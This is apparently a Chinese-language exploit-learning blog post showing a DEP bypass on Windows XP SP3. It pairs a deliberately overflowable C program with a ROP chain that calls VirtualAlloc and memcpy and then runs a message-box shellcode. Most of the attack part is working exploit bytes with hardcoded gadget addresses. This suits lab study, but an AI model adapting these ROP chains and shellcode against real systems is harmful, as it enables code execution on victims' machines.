---
layout:		post
title:		Ret2Libc实战之利用VirtualAlloc
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>说明: 没有启用GS & SafeS.E.H, release版本, 禁用优化
<!-- more -->


VirtualAlloc函数说明
```
LPVOID WINAPI VirtualAlloc(
	__in_opt 	LPVOID	lpAddress,
	__in		SIZE_T	dwSize,
	__in		DWORD	flAllocationType,
	__in		DWORD	flProtect		
);
```

先贴入以下代码测试溢出, eip会覆盖成0x90909090

```
#include "stdafx.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"

void test()
{
	char tt[176];
	memcpy(tt,shellcode,450);
}

int main(int argc, char* argv[])
{
	HINSTANCE hInst=LoadLibrary("shell32.dll");
	char temp[200];
	printf("emmmm");
	test();

	return 0;
}
```

然后就是构造rop链先后调用VirtualAlloc & memcpy

![](/assets/img/exploit/2017-12-22-disable-dep-virtualalloc/0x00.png)

返回eax=0x00030000表示内存分配成功

![](/assets/img/exploit/2017-12-22-disable-dep-virtualalloc/0x01.png)

VirtualAlloc参数传递栈布局如图

```
······					// junk 180 byte
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xE3\x9A\x80\x7C"		// kernel32.VirtualAllocEx   0x7C809AE3
"\x90\x90\x90\x90"
"\x7d\x99\x80\x7c"		// pop eax retn
"\x00\x00\x03\x00"		// 申请空间起始地址
"\xFF\x00\x00\x00"		// 申请空间大小
"\x00\x10\x00\x00"		// 申请类型
"\x40\x00\x00\x00"		// 申请空间访问地址
"\x9e\x37\xfa\x77"		// address of pop edi pop esi retn
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xb8\x1d\x92\x7c"		// memcpy
"\xc7\xc6\xeb\x77"		// jmp eax
"\x00\x00\x03\x00"		// destination
"\xf8\xfe\x12\x00"      // source
"\xff\x00\x00\x00"		// length
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
······					// payload 113 byte
```

根据调试得到存放payload的栈地址, pwn~

![](/assets/img/exploit/2017-12-22-disable-dep-virtualalloc/0x02.png)

由于source地址是调试得到的, 极不稳定, 以下是通用性好些的shellcode

```
······					// junk 180 byte
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xE3\x9A\x80\x7C"		// kernel32.VirtualAllocEx
"\x90\x90\x90\x90"
"\x7d\x99\x80\x7c"		// pop eax retn
"\x00\x00\x03\x00"		// 申请空间起始地址
"\xFF\x00\x00\x00"		// 申请空间大小
"\x00\x10\x00\x00"		// 申请类型
"\x40\x00\x00\x00"		// 申请空间访问地址
"\xB1\x1D\x92\x7C"		// pop esi retn
"\x36\xD4\x5D\x7D"		// pop edi
"\x00\x00\x03\x00"		// destination
"\xA0\x6F\x5F\x7D"		// pop ecx
"\xff\x00\x00\x00"		// length
"\xc6\xc6\xeb\x77"		// source, push esp jmp eax
"\xE5\xE0\x72\x7D"		// push esp pop ebp retn 4
"\xc1\x1d\x92\x7c"		// memcpy
"\x7d\x99\x80\x7c"		// pop eax retn
"\x18\x00\x03\x00"
"\xc7\xc6\xeb\x77"		// jmp eax
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";
```